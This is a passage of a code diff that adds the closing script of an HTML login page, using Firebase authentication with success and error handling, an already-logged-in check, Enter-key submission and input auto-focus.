+                    showToast('✅ Login successful!', 'success');
+                    
+                    // Show success overlay instead of redirect
+                    showSuccessOverlay(
+                        'Welcome Back! 👋',
+                        'You have been logged in successfully.'
+                    );
+                    
+                    // Clear form
+                    document.getElementById('loginIdentifier').value = '';
+                    document.getElementById('loginPassword').value = '';
+                    
+                    isLoggingIn = false;
+                })
+                .catch((error) => {
+                    setButtonError('loginBtn');
+                    errorEl.style.display = 'block';
+                    
+                    let errorMsg = error.message;
+                    if (error.code === 'auth/user-not-found') {
+                        errorMsg = '❌ No account found with this email. Please sign up.';
+                    } else if (error.code === 'auth/wrong-password') {
+                        errorMsg = '❌ Incorrect password. Please try again.';
+                    } else if (error.code === 'auth/invalid-email') {
+                        errorMsg = '❌ Invalid email format.';
+                    } else if (error.code === 'auth/too-many-requests') {
+                        errorMsg = '❌ Too many failed attempts. Please try again later.';
+                    }
+                    errorEl.innerText = errorMsg;
+                    showToast('Login failed: ' + errorMsg, 'error');
+                    isLoggingIn = false;
+                });
+        }
+
+        // ============================================================
+        // CHECK IF USER IS ALREADY LOGGED IN
+        // ============================================================
+        auth.onAuthStateChanged((user) => {
+            if (user && !document.getElementById('successOverlay').classList.contains('show')) {
+                // Show success overlay instead of redirect
+                showSuccessOverlay(
+                    'Welcome Back! 👋',
+                    'You are already logged in.'
+                );
+            }
+        });
+
+        // ============================================================
+        // ENTER KEY SUPPORT
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const loginView = document.getElementById('loginView');
+                const signupView = document.getElementById('signupView');
+                
+                if (loginView.classList.contains('active')) {
+                    document.getElementById('loginBtn').click();
+                } else if (signupView.classList.contains('active')) {
+                    document.getElementById('signupBtn').click();
+                }
+            }
+        });
+
+        // ============================================================
+        // AUTO FOCUS ON FIRST INPUT
+        // ============================================================
+        window.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                const firstInput = document.querySelector('.input-field');
+                if (firstInput) firstInput.focus();
+            }, 500);
+        });
+    </script>
+</body>
+</html>
